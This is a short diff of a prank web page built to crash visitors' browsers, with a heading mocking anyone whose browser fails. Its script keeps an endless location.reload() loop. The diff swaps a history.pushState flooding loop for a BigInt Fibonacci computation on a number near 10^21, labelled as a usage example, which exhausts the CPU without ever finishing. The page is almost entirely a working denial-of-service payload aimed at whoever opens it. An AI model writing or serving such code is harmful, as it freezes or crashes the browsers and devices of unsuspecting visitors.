@@ -11,11 +11,27 @@
 <h1>But if it crashed then try a better browser or update it ;)</h1>
     <script>
         setTimeout(() => { while (1) location.reload(1); }, 100)
-        var total = "";
-        for( var i = 0; i < 10000000000000; i++ ) {
-          total += i.toString();
-          history.pushState(0,0, total );
-        }    
+        function fibonacci(n) {
+  if (n <= 1n) {
+    return n.toString();
+  } else {
+    let a = 0n;
+    let b = 1n;
+    let temp;
+
+    for (let i = 2n; i <= n; i++) {
+      temp = a + b;
+      a = b;
+      b = temp;
+    }
+
+    return b.toString();
+  }
+}
+
+// Exemplo de uso
+const resultado = fibonacci(999999999999999999999n);
+console.log(resultado);  
     </script>
 </body>
 
